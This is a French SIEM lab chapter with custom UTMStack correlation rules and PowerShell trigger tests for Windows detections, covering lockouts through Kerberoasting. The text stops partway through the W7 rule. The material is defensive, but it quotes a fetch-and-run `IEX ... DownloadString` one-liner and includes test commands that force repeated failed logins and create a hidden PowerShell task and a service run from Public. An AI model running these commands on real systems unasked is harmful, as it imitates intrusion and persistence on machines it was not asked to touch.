---
title: "Chapitre 11 : Règles de corrélation YAML personnalisées | DoIt4Everyone"
description: "Création et validation de règles de corrélation YAML personnalisées pour UTMStack v11.3.0 CE : séries W (Windows natif), WD (Windows Defender), S (Sysmon via WEF), L (Linux auditd), M (Microsoft 365/Entra ID), A (Azure Activity Log) et clones de règles natives. Migration du schéma log.* vers event.*, règles d'écriture, prérequis de collecte et méthode de correction des règles natives."
lang: fr
---
<style>
  header, footer { display: none !important; }
  .wrapper {
    max-width: 900px !important;
    margin: 0 auto !important;
    float: none !important;
    position: relative !important;
    padding: 40px 20px !important;
    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif !important;
    font-size: 1.1em !important;
  }
  section {
    width: 100% !important;
    float: none !important;
    margin: 0 !important;
  }
  h1, h2 { text-align: center; }
  table { width: 100%; display: table; margin: 20px 0; }
</style>

# Chapitre 11 : Règles de corrélation YAML personnalisées

> [← Retour à l'index](../)

## Sommaire

- [Migration UTMStack v11.3.0](#migration-utmstack-v1130)
- [Veille CVE et règles compensatoires](#veille-cve-et-règles-de-détection-compensatoires)
- [Prérequis et architecture](#prérequis-et-architecture)
- [Série W : Windows natif](#série-w--windows-natif-wineventlog) : W1 · W2 · W3 · W4 · W5a · W5b · W6 · W7 · S5b
- [Série WD : Windows Defender](#série-wd--windows-defender) : WD1 · WD2 · WD3 · WD4 · WD5
- [Série S : Sysmon via WEF](#série-s--sysmon-via-wef) : S1 · S2 · S3 · S4 · S5
- [Série L : Linux auditd](#série-l--linux-auditd) : L1 · L2
- [Série M : Microsoft 365 et Entra ID](#série-m--microsoft-365-et-entra-id) : Brute Force · Password Spray · Impossible Travel · Mailbox Activity · DLP · MDE · Token Protection · M5 · M6 · M7 · M10 · M2 · M8 · M11 · M12 · M13 · M14 · M-new-1 · M-new-2
- [Série A : Azure Activity Log](#série-a--azure-activity-log) : A1 · A2 · A3 · A4a · A4b · A5 · A6 · A7 · A8 · A9 · A10 · A11
- [Clones de règles natives](#clones-de-règles-natives) : Suricata Medium (876) · PowerShell suspect (1424)
- [Matrice de couverture MITRE ATT&CK](#matrice-de-couverture-mitre-attck)
- [Note finale](#note-finale--détection-comportementale-cve-et-complémentarité-des-outils)

---

Ce chapitre documente la création et la validation de règles de corrélation personnalisées pour UTMStack v11. Chaque règle est testée en conditions réelles avant publication. Les règles qui n'ont pas pu être testées sont signalées explicitement dans leur section.

Les règles couvrent six sources de logs : Windows natif (wineventlog), Sysmon via WEF, Linux (auditd), Windows Defender, Microsoft 365 et Azure Activity Log. Elles sont organisées en séries : W (Windows), WD (Windows Defender), S (Sysmon), L (Linux), M (M365/Entra ID) et A (Azure). Les fichiers YAML et leur statut sont dans le dossier [`rules/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules) du dépôt.

---

## Migration UTMStack v11.3.0

> ⚠️ **Ce chapitre décrit l'état v11.3.0 du lab (novembre 2026).** La version précédente, écrite pour UTMStack v11.2 (champs `log.*`), reste disponible dans la release [`v11.2-final`](https://github.com/doit4everyone/utmstack-lab/releases/tag/v11.2-final) du dépôt.

### Ce qui a changé

La v11.3.0 remplace le sac de champs `log.*` par `event.*`, indexé en `flat_object` dans OpenSearch. L'objectif de l'éditeur est de supprimer les conflits de typage dynamique, qui faisaient rejeter des documents entiers. La contrepartie est double :

- **les règles personnalisées en `log.*` ne matchent plus rien.** Aucune erreur n'est signalée : la règle reste active et ne se déclenche simplement plus. Toutes les règles de ce chapitre ont été migrées et revalidées une par une ;
- **les champs `event.*` ne sont plus agrégeables** dans OpenSearch. L'éditeur a ajouté un second espace typé, `utm.*`, alimenté par une dizaine de filtres (Windows, O365, Linux, Azure, etc.), mais pas par Suricata.

Un seul renommage touche nos règles Windows, Sysmon et Defender : `TargetSid` devient `event.eventDataTargetSid` (W3). Aucun renommage ne touche nos règles O365.

### Bilan de la revalidation

La migration a révélé des défauts qui existaient déjà en v11.2 :

- **S3** (named pipe) n'avait jamais produit d'alerte : `\.` est un échappement invalide en CEL et faisait échouer la règle en silence ;
- **WD1** (malware détecté) n'avait jamais fonctionné : le champ s'appelle `Threat Name`, avec une espace ;
- **S4** excluait par erreur tout le dossier `C:\Windows\System32\`, donc `ntdsutil`, `esentutl` et `vssadmin`, c'est-à-dire précisément les outils de vol de NTDS ;
- **Brute Force** et **Password Spray** avaient une définition identique : les seuils ont été ajoutés par `afterEvents`.

Plusieurs règles ont été retirées parce que la v11.3.0 apporte une règle native équivalente : W2, M-new-1, M-new-2 et les deux règles DLP. M5 a été retirée pour une autre raison, détaillée dans sa section. Les règles retirées restent publiées dans [`rules/retirees/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/retirees), pour les environnements où la règle native n'existe pas.

### Corriger une règle native : la méthode du clone

Le backend v11.3.0 réécrit les règles natives depuis ses propres fichiers à chaque démarrage, en conservant seulement leur statut actif ou inactif. Une exclusion ajoutée directement en base disparaît donc au prochain redémarrage. La méthode retenue :

1. copier la définition de la règle native dans une règle utilisateur, avec l'exclusion ;
2. désactiver la règle native **par son nom** (les identifiants changent d'une version à l'autre) ;
3. redémarrer les event-processors.

Les deux clones du lab sont décrits dans la section [Clones de règles natives](#clones-de-règles-natives).

### Diagnostiquer dans OpenSearch

Une requête qui renvoie 0 résultat ne prouve rien en v11.3.0 : deux requêtes courantes renvoient 0 sans aucune erreur.

- **`match_phrase` sur un champ `event.*`** : le `flat_object` ne le supporte pas. Utiliser `term` sur la valeur exacte, ou chercher dans `raw`.
- **`wildcard` sur `raw`** : `raw` est un texte analysé, découpé en mots. Une chaîne qui contient des `.` ou des `:` ne correspond à aucun mot.

Avant de conclure qu'un événement est absent, refaire la requête sur une fenêtre où l'on sait qu'il existe (témoin positif).

---

## Veille CVE et règles de détection compensatoires

Un SIEM custom n'est pas qu'un outil de détection comportementale, c'est aussi un filet de sécurité pendant la fenêtre de vulnérabilité qui sépare la publication d'une CVE critique de son déploiement en production. Dans une PME, cette fenêtre dure souvent plusieurs semaines : le temps de tester le patch, de planifier la maintenance, et de l'appliquer sans interrompre les opérations. Pendant ce temps, la CVE est publique, les exploits sont disponibles, et les attaquants sont actifs.

Les règles de corrélation personnalisées permettent de combler partiellement cette fenêtre. Une CVE qui exploite un mécanisme d'authentification sera souvent détectée par une règle comportementale existante, W6 (Pass-the-Hash), W7 (Kerberoasting), Impossible Travel, même si aucune règle dédiée à la CVE n'a été écrite. C'est la valeur de l'approche comportementale: elle reste pertinente indépendamment des CVE publiées car les techniques ATT&CK sous-jacentes ne changent pas.

Pour les CVE qui sortent du cadre comportemental couvert, la réponse peut être une règle ciblée et temporaire active jusqu'au patch, puis désactivée. Ce chapitre illustre cette philosophie à travers les deux axes qui se complètent: détection comportementale pérenne et réponse événementielle aux CVE critiques.

---

## Prérequis et architecture

### Format YAML UTMStack v11

Chaque règle respecte le format suivant :

```yaml
name: "Nom de la règle"
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: "Authentication"
technique: "T1110 - Brute Force"
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1110/
description: 'Description de la règle. Next Steps: 1. ... 2. ...'
where: |-
  condition1 &&
  condition2
afterEvents: []
groupBy: []
deduplicateBy: []
```

### Règles d'écriture (v11.3.0)

Ces points ont tous été constatés dans le lab. Les ignorer ne produit en général aucune erreur visible : la règle s'importe, reste active et ne se déclenche jamais.

**Point littéral dans une regex** : écrire `[.]` ou `\\.`, jamais `\.`. `\.` est un échappement invalide en CEL et fait échouer l'évaluation à chaque événement.

**Champs facultatifs** : garder un champ par `exists()` avant de le tester (`exists("event.data.New Value") && contains("event.data.New Value", …)`). Un champ absent fait échouer l'évaluation.

**Disjoncteur (« Circuit Breaker »)** : une règle qui échoue 5 fois à l'évaluation est coupée temporairement, et une alerte « Circuit Breaker: <nom de la règle> » est générée. Le moteur ne journalise pas le message d'erreur : il faut relire la condition. Les deux causes rencontrées sont les deux points ci-dessus.

**`afterEvents` et champs texte** : `action`, `origin.user`, `origin.ip` (dans les anciens index), `origin.geolocation.countryCode` et `dataSource` sont indexés en texte. Dans un `afterEvents`, utiliser leur sous-champ `.keyword` (`origin.user.keyword`), sinon le filtre ne matche jamais. Les sous-champs de `event.*` s'utilisent directement.

**Libellés traduits** : `Changed Type`, `ServiceType`, `StartType` dépendent de la langue de Windows. Prévoir les deux langues (`!oneOf("event.data.Changed Type", ["Ignoré", "Ignored"])`), ou filtrer sur un champ numérique.

**Listes d'objets** : `ModifiedProperties` et `Parameters` (O365) ne sont pas utilisables dans une condition. Alerter sur l'action et lire la valeur dans l'alerte.

**Identifiants de compte O365** : la `UserKey` d'Exchange (PUID) n'est pas celle d'Entra ID (ID d'objet). Pour relier deux workloads, passer par l'UPN.

**Valeur YAML contenant `: `** : la mettre entre guillemets (`technique: 'T1059.001 - Command and Scripting Interpreter: PowerShell'`), sinon l'import échoue avec `bad indentation of a mapping entry`.

**Parenthèses avec `||`** : elles fonctionnent en v11.3.0 (S1, S4, règles natives). Le plantage constaté en v11.2 ne s'est pas reproduit.

**`groupBy` et `deduplicateBy`** : les règles de ce chapitre les laissent vides. En v11.2, une valeur non vide avait bloqué le déclenchement de W1. En v11.3.0, des règles natives (`groupBy: [dataSource]`) et la règle de heartbeat du [chapitre 09](09-pipeline-llm.html) (`@timestamp`) se déclenchent avec une valeur : le constat est à requalifier, mais n'a pas été retesté.

**Champ `raw`** : il est évalué par le moteur, au moins pour le dataType syslog (règle de heartbeat, `contains("raw", …)`). Notre constat de v11.2 (« `raw` n'est pas évalué ») était faux. Préférer malgré tout un champ structuré quand il existe.

**Mise à jour d'une règle** : supprimer l'ancienne version et réimporter le YAML. Ne pas éditer une règle en place.

**Redémarrage après import** : les event-processors chargent les règles en mémoire. Après chaque import, les redémarrer :

```bash
docker service update --force utmstack_event-processor-worker
sleep 30
docker service update --force utmstack_event-processor-manager
```

Sans ce redémarrage, la règle apparaît dans la liste des corrélations mais ne se déclenche pas. Les règles ne sont pas rétroactives : elles ne s'appliquent qu'aux événements reçus après le redémarrage.

### Prérequis de collecte

Plusieurs règles dépendent d'un réglage d'audit absent par défaut. Sans lui, la règle est importée sans erreur mais ne voit jamais l'événement.

| Règle | Prérequis |
|---|---|
| S1 | Audit « Création du processus » `{0CCE922B-69AE-11D9-BED3-505054503030}` et GPO « Inclure la ligne de commande dans les événements de création de processus » (Configuration ordinateur → Stratégies → Modèles d'administration → Système → Audit de la création de processus) |
| W4 | Audit « Autres événements d'accès à l'objet » `{0CCE9227-69AE-11D9-BED3-505054503030}` |
| S5b | Audit du registre et SACL sur les clés `Run` et `RunOnce` |
| PowerShell suspect (clone 1424) | GPO « Activer la journalisation des blocs de scripts PowerShell » (Modèles d'administration → Composants Windows → Windows PowerShell) |
| S2 à S5 | Sysmon et abonnement WEF vers le collecteur ; S5 exige une configuration Sysmon qui journalise les clés `Run` |
| M10, M12, Mailbox Activity | Audit des boîtes aux lettres Exchange ; M10 exige l'étiquetage automatique Purview |
| Impossible Travel, Mailbox Activity | Géolocalisation activée dans UTMStack |

Pour vérifier une sous-catégorie d'audit sur une machine : `auditpol /get /subcategory:"{GUID}"`.

**Journalisation des blocs de scripts PowerShell** : sans cette GPO, PowerShell ne journalise en 4104 que les blocs qu'il juge suspicieux d'après sa propre liste. Dans le lab, une commande `IEX (New-Object Net.WebClient).DownloadString(...)` tapée en console n'a produit aucun 4104 sur DC01. Après activation (clé `HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging`, valeur `EnableScriptBlockLogging = 1`) et ouverture d'une nouvelle console, le même bloc est journalisé. Le réglage est lu au démarrage de la session PowerShell. Toute règle fondée sur le 4104, y compris la règle native, ne voit sans lui qu'une partie des scripts. Le volume de 4104 augmente sensiblement : un serveur Entra Connect journalise par exemple tous les modules Azure AD Sync qu'il charge.

---

## Série W : Windows natif (wineventlog)

Les règles W détectent des comportements suspects sur les systèmes Windows en utilisant les journaux d'événements natifs. Elles ne dépendent pas de Sysmon et fonctionnent sur tous les systèmes Windows avec l'agent UTMStack. Les fichiers YAML sont disponibles dans [`rules/windows/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/windows).

### W1 : Account Lockout Detected (EID 4740)

Un compte utilisateur a été verrouillé suite à un nombre excessif d'échecs d'authentification. Peut indiquer une attaque par force brute ou par pulvérisation de mots de passe. L'event est généré sur le contrôleur de domaine qui effectue le verrouillage.

**Technique MITRE :** T1110 · Brute Force

✅ **Statut v11.3.0 :** validée. Le champ `target.domain` contient en réalité la machine source du verrouillage (Caller Computer Name).

```yaml
name: W1 - Account Lockout Detected
dataTypes:
  - wineventlog
impact:
  confidentiality: 2
  integrity: 3
  availability: 3
category: Authentication
technique: T1110 - Brute Force
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1110/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4740
description: 'Un compte utilisateur a été verrouillé suite à un nombre excessif d''échecs d''authentification (EID 4740). Peut indiquer une attaque par force brute ou par pulvérisation de mots de passe. L''event est généré sur le contrôleur de domaine effectuant le verrouillage. Next Steps: 1. Identifier la machine source du verrouillage via le champ target.domain. 2. Vérifier les events 4625 (échecs d''authentification) précédant le verrouillage sur la même machine. 3. Contrôler si plusieurs comptes sont verrouillés simultanément (signe de password spray). 4. Réinitialiser le compte après investigation. 5. Vérifier si le compte ciblé est un compte privilégié.'
where: |-
  equals("event.eventCode", 4740) &&
  equals("event.channel", "Security") &&
  exists("target.user") &&
  !regexMatch("target.user", "(?i)\\$$")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

Depuis une machine membre du domaine, créer un compte de test et provoquer son verrouillage :

```powershell
# Sur DC01-MAIN-SITE (contrôleur de domaine), création du compte de test
New-ADUser -Name "test-lockout" -SamAccountName "test-lockout" `
  -UserPrincipalName "test-lockout@lan.local" `
  -AccountPassword (ConvertTo-SecureString "TestLab2026!" -AsPlainText -Force) `
  -Enabled $true

# Depuis n'importe quelle machine membre, verrouillage par tentatives répétées
1..10 | ForEach-Object {
    net use \\DC01-MAIN-SITE\IPC$ /user:lan\test-lockout MauvaisMDP
    net use \\DC01-MAIN-SITE\IPC$ /delete 2>$null
}

# Nettoyage
Remove-ADUser -Identity "test-lockout" -Confirm:$false
```

**Faux positifs :** les comptes machine (suffixe `$`) peuvent être verrouillés lors de rotations de mot de passe, d'où leur exclusion par le filtre `!regexMatch("target.user", "(?i)\\$$")`.

---

### W2 : Member Added to Local Administrators Group (EID 4732)

> 🗄️ **Retirée en v11.3.0.** Entièrement couverte par la règle native 1512 de la v11.3.0. Le fichier reste disponible dans [`rules/retirees/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/retirees) pour les environnements où cette règle native n'existe pas.

Un compte a été ajouté au groupe Administrateurs local. Le filtre sur le SID universel `S-1-5-32-544` garantit la détection indépendamment de la langue du système (Administrateurs en français, Administrators en anglais).

**Technique MITRE :** T1098 · Account Manipulation

```yaml
name: W2 - Member Added to Local Administrators Group
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Privilege Escalation
technique: T1098 - Account Manipulation
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1098/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4732
description: 'Un compte a été ajouté au groupe Administrateurs local (EID 4732, SID S-1-5-32-544). Le filtre sur le SID universel S-1-5-32-544 garantit la détection indépendamment de la langue du système. Peut indiquer une tentative de persistance ou d''élévation de privilèges sur un serveur membre. Next Steps: 1. Identifier le compte ajouté via event.data.MemberSid. 2. Vérifier si un EID 4720 (création de compte local) précède cet event sur la même machine. 3. Contrôler qui a effectué l''opération via event.eventDataSubjectUserName. 4. Vérifier si l''ajout est légitime (GPO, script d''administration). 5. Supprimer le compte si non autorisé et investiguer le vecteur d''accès initial.'
where: |-
  equals("event.eventCode", 4732) &&
  equals("event.channel", "Security") &&
  equals("event.eventDataTargetSid", "S-1-5-32-544")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

Sur un serveur membre (gest-srv, serveur membre du domaine) en PowerShell admin. Attention : sur les systèmes Windows Server 2025 en français, le groupe s'appelle `Administrateurs` et non `Administrators`. Utiliser le nom localisé ou passer par le SID.

```powershell
New-LocalUser -Name "testlocal-w2" `
  -Password (ConvertTo-SecureString "TestLab2026!" -AsPlainText -Force) `
  -PasswordNeverExpires

Add-LocalGroupMember -Group "Administrateurs" -Member "testlocal-w2"

# Nettoyage
Remove-LocalGroupMember -Group "Administrateurs" -Member "testlocal-w2"
Remove-LocalUser -Name "testlocal-w2"
```

---

### W3 : Member Added to Group Policy Creator Owners (EID 4728/4756)

Un compte a été ajouté au groupe Group Policy Creator Owners (RID -520). Ses membres peuvent créer des GPO et, par elles, exécuter du code sur toutes les machines auxquelles une GPO est liée. Le filtre sur le RID rend la détection indépendante de la langue du système.

**Technique MITRE :** T1098 · Account Manipulation

✅ **Statut v11.3.0 :** validée. La version v11.2 couvrait aussi Domain Admins (-512), Schema Admins (-518) et Enterprise Admins (-519). La v11.3.0 apporte une règle native (1512 dans le lab) qui couvre ces trois groupes, mais pas le -520 : W3 est réduite à ce seul RID et renommée. Le champ `TargetSid` est devenu `event.eventDataTargetSid`.

```yaml
name: W3 - Member Added to Group Policy Creator Owners
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 3
category: Privilege Escalation
technique: T1098 - Account Manipulation
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1098/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4728
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4756
description: 'Un compte a été ajouté au groupe Group Policy Creator Owners (RID -520, EID 4728 ou 4756). Les membres de ce groupe peuvent créer des GPO et, par elles, exécuter du code sur toutes les machines auxquelles une GPO est liée. Les ajouts aux groupes Domain Admins (-512), Schema Admins (-518) et Enterprise Admins (-519) sont couverts par la règle native v11.3.0 ; cette règle ne cible que le RID que la règle native ne couvre pas. Ces événements sont générés sur le contrôleur de domaine. Next Steps: 1. Identifier le compte ajouté via le SID membre de l''événement. 2. Vérifier qui a effectué l''opération via event.eventDataSubjectUserName. 3. Confirmer si l''ajout est autorisé (ticket de changement, procédure administrative). 4. Retirer immédiatement le compte si l''ajout n''est pas autorisé. 5. Lister les GPO créées ou modifiées depuis l''ajout et investiguer les connexions récentes du compte ayant effectué l''opération (EID 4624).'
where: |-
  oneOf("event.eventCode", [4728, 4756]) &&
  equals("event.channel", "Security") &&
  regexMatch("event.eventDataTargetSid", "-520$")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

Sur DC01-MAIN-SITE (contrôleur de domaine) en PowerShell admin. Le groupe est retrouvé par son SID, ce qui évite de dépendre de son nom localisé.

```powershell
# Créer un compte de test si nécessaire
New-ADUser -Name "ch11-test" -SamAccountName "ch11-test" `
  -AccountPassword (ConvertTo-SecureString "TestLab2026!" -AsPlainText -Force) -Enabled $true

# Group Policy Creator Owners, retrouvé par son RID -520
$gpco = Get-ADGroup -Identity "$((Get-ADDomain).DomainSID)-520"

# Ajouter puis retirer immédiatement
Add-ADGroupMember -Identity $gpco -Members "ch11-test"
Remove-ADGroupMember -Identity $gpco -Members "ch11-test" -Confirm:$false

# Nettoyage
Remove-ADUser -Identity "ch11-test" -Confirm:$false
```

---

### W4 : Suspicious Scheduled Task Created (EID 4698)

Une tâche planifiée a été créée en dehors des namespaces système légitimes. Les tâches planifiées sont un vecteur de persistance fréquemment utilisé par les attaquants.

**Technique MITRE :** T1053.005 · Scheduled Task

✅ **Statut v11.3.0 :** validée, après activation de l'audit « Autres événements d'accès à l'objet » (voir les prérequis de collecte).

```yaml
name: W4 - Suspicious Scheduled Task Created
dataTypes:
  - wineventlog
impact:
  confidentiality: 2
  integrity: 3
  availability: 2
category: Persistence
technique: T1053.005 - Scheduled Task
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1053/005/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4698
description: 'Une tâche planifiée a été créée en dehors des namespaces système légitimes (EID 4698). Les tâches planifiées sont un vecteur de persistance fréquemment utilisé par les attaquants. Les namespaces Microsoft, Windows, SoftLanding et les tâches créées par SYSTEM ou les comptes machine sont exclus. Next Steps: 1. Examiner le contenu XML de la tâche via event.data.TaskContent pour identifier la commande exécutée. 2. Vérifier le compte ayant créé la tâche via event.eventDataSubjectUserName. 3. Contrôler si la tâche pointe vers un exécutable dans un chemin inhabituel (temp, appdata, etc.). 4. Supprimer la tâche si non autorisée : Unregister-ScheduledTask -TaskName "nom" -Confirm:$false. 5. Investiguer les autres activités du compte créateur dans la même fenêtre temporelle.'
where: |-
  equals("event.eventCode", 4698) &&
  equals("event.channel", "Security") &&
  !equals("event.eventDataSubjectUserSid", "S-1-5-18") &&
  !regexMatch("event.eventDataSubjectUserName", "(?i)\\$$") &&
  !regexMatch("event.data.TaskName", "(?i)^\\\\(Microsoft|Windows|SoftLanding)\\\\") &&
  !contains("event.data.TaskName", "CreateExplorerShellUnelevatedTask")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
  -Argument "-NoProfile -WindowStyle Hidden -Command whoami"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5)
Register-ScheduledTask -TaskName "test-w4" -Action $action -Trigger $trigger -Force
Unregister-ScheduledTask -TaskName "test-w4" -Confirm:$false
```

---

### W5a : Service Installed from User or Temp Directory (EID 7045)

Un nouveau service Windows a été installé depuis un répertoire utilisateur ou temporaire. Les services légitimes s'installent dans Program Files ou Windows.

**Technique MITRE :** T1543.003 · Windows Service

✅ **Statut v11.3.0 :** validée. La règle exclut désormais les pilotes noyau : un pilote installé depuis un dossier utilisateur déclenchait à la fois W5a et W5b.

```yaml
name: W5a - Service Installed from User or Temp Directory
dataTypes:
  - wineventlog
impact:
  confidentiality: 2
  integrity: 3
  availability: 3
category: Persistence
technique: T1543.003 - Create or Modify System Process Windows Service
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1543/003/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-7045
description: 'Un nouveau service Windows a été installé depuis un répertoire utilisateur ou temporaire (EID 7045). Les services légitimes s''installent dans Program Files ou Windows, un service depuis Temp, AppData ou Public est un signal fort de persistance malveillante. Next Steps: 1. Examiner le chemin complet via event.eventDataImagePath. 2. Identifier le compte ayant installé le service via event.data.AccountName. 3. Analyser l''exécutable (hash, VirusTotal). 4. Arrêter et supprimer le service : Stop-Service "nom" ; sc.exe delete "nom". 5. Investiguer les autres activités sur la machine dans la même fenêtre temporelle.'
where: |-
  equals("event.eventCode", 7045) &&
  equals("event.channel", "System") &&
  regexMatch("event.eventDataImagePath", "(?i)(\\\\temp\\\\|\\\\appdata\\\\|\\\\public\\\\|\\\\users\\\\|%temp%|%appdata%)") &&
  !regexMatch("event.eventDataServiceType", "(?i)(noyau|kernel)")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

```powershell
Copy-Item "C:\Windows\System32\cmd.exe" "$env:PUBLIC\test-w5a.exe"
sc.exe create "test-w5a" binPath= "C:\Users\Public\test-w5a.exe" start= demand
sc.exe delete "test-w5a"
Remove-Item "$env:PUBLIC\test-w5a.exe"
```

---

### W5b : Kernel Driver Installed Outside System32 (EID 7045)

Un pilote en mode noyau a été installé depuis un chemin inhabituel hors de `system32\drivers`. Les drivers noyau légitimes résident dans `system32\drivers`.

**Note :** cette règle n'a pas pu être testée en live (risque BSOD avec un driver non signé). La logique est validée sur les données historiques du lab.

**Technique MITRE :** T1014 · Rootkit

✅ **Statut v11.3.0 :** validée par un test scripté : création d'un service de type pilote noyau pointant hors de `System32\drivers`, sans fichier ni démarrage.

```yaml
name: W5b - Kernel Driver Installed Outside System32
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 3
category: Defense Evasion
technique: T1014 - Rootkit
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1014/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-7045
description: 'Un pilote en mode noyau a été installé depuis un chemin inhabituel hors de system32\drivers (EID 7045). Les drivers noyau légitimes résident dans system32\drivers, un driver installé ailleurs est un indicateur fort de rootkit ou de technique d''évasion avancée. Next Steps: 1. Examiner le chemin du driver via event.eventDataImagePath. 2. Vérifier la signature numérique du fichier .sys. 3. Analyser le driver (hash, VirusTotal, analyse statique). 4. Arrêter et supprimer le service : sc.exe stop "nom" ; sc.exe delete "nom". 5. Envisager une analyse forensique complète de la machine.'
where: |-
  equals("event.eventCode", 7045) &&
  equals("event.channel", "System") &&
  regexMatch("event.eventDataServiceType", "(?i)(noyau|kernel)") &&
  !regexMatch("event.eventDataImagePath", "(?i)system32\\\\drivers\\\\")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Note :** le champ `event.eventDataServiceType` contient `"pilote en mode noyau"` sur les systèmes Windows en français et `"kernel mode driver"` en anglais. Le `regexMatch` avec alternance `(?i)(noyau|kernel)` couvre les deux langues sans modification supplémentaire.

---

### W6 : NTLM Network Logon, possible Pass-the-Hash (EID 4624)

Un logon réseau NTLM (LogonType 3) a été détecté depuis un compte utilisateur. Dans un environnement Active Directory où NTLM est réduit au minimum, les logons réseau légitimes utilisent Kerberos. Un logon NTLM réseau peut indiquer une attaque Pass-the-Hash ou une connexion par adresse IP directe qui force le passage en NTLM.

**Technique MITRE :** T1550.002 · Pass the Hash

🔵 **Statut v11.3.0 :** validée en passif (déclenchements spontanés). Une exclusion a été ajoutée pour le couple poste d'administration et compte, voir plus bas.

```yaml
name: W6 - NTLM Network Logon (possible Pass-the-Hash)
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Lateral Movement
technique: T1550.002 - Pass the Hash
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1550/002/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624
description: 'Un logon réseau NTLM (LogonType 3) a été détecté depuis un compte utilisateur (EID 4624). Dans un environnement Active Directory où NTLM est réduit au minimum, les logons réseau légitimes utilisent Kerberos. Un logon NTLM réseau depuis un compte utilisateur réel peut indiquer une attaque Pass-the-Hash ou une connexion par adresse IP directe. Les comptes machine et les logons locaux sont exclus. Next Steps: 1. Identifier la machine source via origin.ip et origin.host. 2. Vérifier si la connexion a été établie par IP (forçant NTLM) plutôt que par nom. 3. Contrôler les autres activités du compte target.user dans la même fenêtre temporelle. 4. Vérifier si des outils de type Mimikatz ont été exécutés sur la machine source (EID 4688, Sysmon EID 1). 5. Investiguer les mouvements latéraux depuis origin.ip vers d''autres machines.'
where: |-
  equals("event.eventCode", 4624) &&
  equals("event.channel", "Security") &&
  equals("event.eventDataLogonType", "3") &&
  equals("event.eventDataAuthenticationPackageName", "NTLM") &&
  exists("target.user") &&
  !regexMatch("target.user", "(?i)\\$$") &&
  !regexMatch("target.user", "(?i)^(MSOL_|AAD_|AZUREADSSOACC)") &&
  !equals("origin.ip", "127.0.0.1") &&
  !equals("origin.ip", "::1") &&
  exists("origin.ip") &&
  !(equals("origin.host", "ADMIN-WORKSTATION") && equals("target.user", "admin"))
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Note d'adaptation :** la dernière ligne exclut le couple `origin.host = ADMIN-WORKSTATION` et `target.user = admin`. Dans le lab, elle correspond au poste d'administration, hors domaine, qui ouvre des sessions RDP avec NLA : l'authentification passe alors en NTLM et déclenchait la règle à chaque connexion. Remplacer ces deux valeurs par celles de votre environnement, ou supprimer la ligne. N'exclure jamais le poste seul : tout autre compte utilisé depuis ce poste échapperait à la détection. Dans un environnement où NTLM est correctement désactivé, tout hit est suspect. Le compte `MSOL_` est le compte de synchronisation Entra Connect : son exclusion est indispensable dans les environnements hybrides pour éviter des faux positifs en rafale.

**Test de déclenchement**

Depuis WIN11-AD-TESTS, ouvrir l'Explorateur Windows et accéder à `\\10.100.1.16\C$` en saisissant l'adresse IP directement plutôt que le nom d'hôte. La connexion par IP force le protocole NTLM même quand Kerberos est disponible sur le réseau.

---

### W7 : Kerberoasting RC4 Encryption Detected (EID 4769)

Une demande de ticket Kerberos avec chiffrement RC4 (type 23) a été détectée. Dans un environnement moderne, les tickets légitimes utilisent AES256 (type 18). Une demande RC4 sur un compte de service avec SPN est le signal caractéristique d'une attaque Kerberoasting : l'attaquant récupère le hash RC4 pour le cracker hors ligne.

**Technique MITRE :** T1558.003 · Kerberoasting

✅ **Statut v11.3.0 :** validée. En v11.3.0, le filtre Windows d'UTMStack marque déjà le 4769 suspect (`event.authenticationCandidate.kerberoastingDetection = match`).

```yaml
name: W7 - Kerberoasting RC4 Encryption Detected
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Credential Access
technique: T1558.003 - Steal or Forge Kerberos Tickets Kerberoasting
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1558/003/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769
